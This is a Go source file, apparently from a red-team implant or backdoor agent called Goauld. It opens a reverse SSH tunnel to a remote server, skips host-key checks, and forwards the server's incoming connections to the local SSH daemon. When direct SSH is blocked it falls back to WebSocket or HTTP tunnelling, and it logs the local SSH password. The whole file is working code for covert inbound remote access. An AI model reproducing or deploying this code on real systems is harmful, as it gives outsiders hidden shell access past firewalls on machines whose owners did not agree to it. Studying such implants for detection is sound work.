package ssh

import (
	"Goauld/agent/agent"
	"Goauld/agent/ssh/transport"
	"Goauld/common/log"
	"context"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"net"
	"strings"
	"time"
)

func connect() error {

	privateKey, err := ssh.ParsePrivateKey([]byte(agent.Get().SShPrivateKey))
	if err != nil {
		return err
	}
	sshConfig := &ssh.ClientConfig{
		User:            agent.Get().Id,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(privateKey)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-2.0-Client",
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	client, err := initClient(sshConfig, ctx)
	if err != nil {
		log.Error().Err(err).Msg("ssh init client failed")
		return err
	}

	defer client.Close()

	remoteListener, err := client.Listen("tcp", agent.Get().RemoteForwardedSshdAddress())
	if err != nil {
		return fmt.Errorf("failed to start remote listener: %w", err)
	}

	remotePort := remoteListener.Addr().(*net.TCPAddr).Port
	log.Info().Msgf("Remote port: %d", remotePort)
	log.Info().Msg("LocalSshPassword is:")
	log.Trace().Msg(agent.Get().LocalSShdPassword())
	defer remoteListener.Close()

	for {
		remoteConn, err := remoteListener.Accept()
		if err != nil {
			// TODO faire du throttle si on garde l'erreur, voir pour cuoper proprement après un temp ?
			log.Error().Err(err).Msg("failed to accept remote connection")
			continue
		}

		go func() {

			localConn, err := net.Dial("tcp", agent.Get().LocalSShdAddress())
			if err != nil {
				log.Error().Err(err).Msg("failed to connect to local service")
				return
			}
			defer localConn.Close()
			//TODO: gérer proprement les Copy?
			go io.Copy(localConn, remoteConn)
			io.Copy(remoteConn, localConn)
		}()

	}
}

func initClient(sshConfig *ssh.ClientConfig, ctx context.Context) (*ssh.Client, error) {

	for _, proto := range agent.Get().GetRsshOrder() {
		switch {
		case strings.HasPrefix(proto, "ssh"):
			log.Info().Msgf("Trying to direct connect to ssh server")
			client, err := transport.DirectSshConnect(sshConfig)
			if err != nil {
				log.Error().Err(err).Msg("Failed to connect directly to ssh server")
				continue
			}
			log.Info().Msgf("Direct connection to the ssh server successfully")
			return client, nil

		case strings.HasPrefix(proto, "ws"):
			log.Info().Msg("Trying to proxify SSH using websocket")
			wsConn, err := transport.GetWebsocketConn(ctx)
			if err != nil {
				log.Error().Err(err).Msg("Failed to create WebSocket connection")
				continue
			}
			client, err := tryProxifySsh(sshConfig, wsConn)
			if err != nil {
				log.Error().Err(err).Msg("failed to proxify ssh connection using websocket")
				continue
			}
			log.Info().Msg("Proxify using websocket succeeded")
			return client, nil

		case strings.HasPrefix(proto, "http"):
			log.Info().Msg("Trying to proxify SSH using HTTP")
			httpConn := transport.NewSSHTTPConn()
			err := httpConn.Connect()
			if err != nil {
				log.Error().Err(err).Msg("failed to proxify SSH using HTTP")
				continue
			}
			//httpConn.Start()
			client, err := tryProxifySsh(sshConfig, httpConn)
			if err != nil {
				log.Error().Err(err).Msg("failed to proxify ssh connection using HTTP")
				continue
			}
			log.Info().Msg("Proxify using HTTP succeeded")
			return client, nil
		}
	}

	// TODO handle other connections (tlssh, etc...)
	return nil, fmt.Errorf("failed to Proxify ssh connection")
}

func tryProxifySsh(conf *ssh.ClientConfig, netConn net.Conn) (*ssh.Client, error) {
	chanSuccess := make(chan *ssh.Client)
	chanErr := make(chan error)

	var err error

	go func() {
		_conn, ch, req, _err := ssh.NewClientConn(netConn, agent.Get().WSshUrl(), conf)
		if _err != nil {
			err = _err
			chanErr <- err
			return
		}
		chanSuccess <- ssh.NewClient(_conn, ch, req)
	}()

	select {
	case client := <-chanSuccess:
		return client, nil
	case err := <-chanErr:
		return nil, err
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("timeout while proxying ssh")
	}
}

func Connect() {
	go func() {
		err := connect()
		if err != nil {
			log.Error().Err(err).Msg("ssh connect failed")
		}
	}()
}
